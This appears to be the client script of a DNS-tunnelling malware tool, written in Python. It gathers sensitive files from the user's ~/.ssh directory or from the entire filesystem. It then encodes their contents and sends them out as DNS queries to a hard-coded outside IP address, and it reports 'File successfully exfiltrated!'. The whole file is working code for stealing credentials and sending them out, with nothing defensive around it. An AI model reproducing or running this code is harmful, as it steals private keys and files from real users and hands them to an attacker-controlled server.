#!/usr/bin/env python3

# Service level dependencies
import binascii
import hashlib
import os
import sys
import time
from uuid import getnode as get_mac
from pathlib import Path

# Constants
FILEPATH = os.path.abspath(__file__)

# Path modification for project dependencies
def parent_chain(path, n):
    for i in range(n):
        path = os.path.dirname(path)
    return path
sys.path.insert(1, parent_chain(FILEPATH, 2))

# Project level dependencies
from client.extractor import Extractor
from dns.resolver import Resolver
from lib.data_encoder import Encoder

def send_file_to_server(file, name, server_ip):
    resolver = Resolver(configure=False)
    mac_address = hex(get_mac())[2:]
    timestamp = int(time.time())
    responses = []
    with open(file) as f:
        try:
            payload = f.read()
        except:
            # If the payload has bytes that can't be read, just return and don't send to the server.
            return
        requests = Encoder.encode_payload(
            mac_address, timestamp, name, payload)
        for request in requests:
            resolver.nameservers = [server_ip]
            try:
                # To prevent collisions
                time.sleep(500)
                query = resolver.query(request)
                query_result = [result.to_text() for result in query]
                responses.extend(query_result)
            except:
                pass
    return responses

def start(ip, scan_entire_filesystem):
    home_directory = str(Path.home())
    sensitive_files = None
    if scan_entire_filesystem:
        sensitive_files = Extractor().get_sensitive_files("/")
    else:
        sensitive_files = Extractor().get_sensitive_files(home_directory + "/.ssh")
    for sensitive_file in sensitive_files:
        send_file_to_server(sensitive_file, sensitive_file, ip)

if __name__ == '__main__':
    import argparse
    import os
    import sys
    parser = argparse.ArgumentParser(description='DNS tunneling malware client')
    parser.add_argument('--file', nargs='?', default='')
    parser.add_argument('--should_scan', nargs='?', default='no')
    parser.add_argument('--entire_filesystem', nargs='?', default='no')
    parser.add_argument('--ip', nargs='?', default='167.99.224.175')
    args = parser.parse_args()
    if args.should_scan == 'yes':
        start(args.ip, args.entire_filesystem=="yes")
    else: 
        response = send_file_to_server(args.file, 'test', args.ip)
        print('Response: {}'.format(response))
    print('File successfully exfiltrated!')
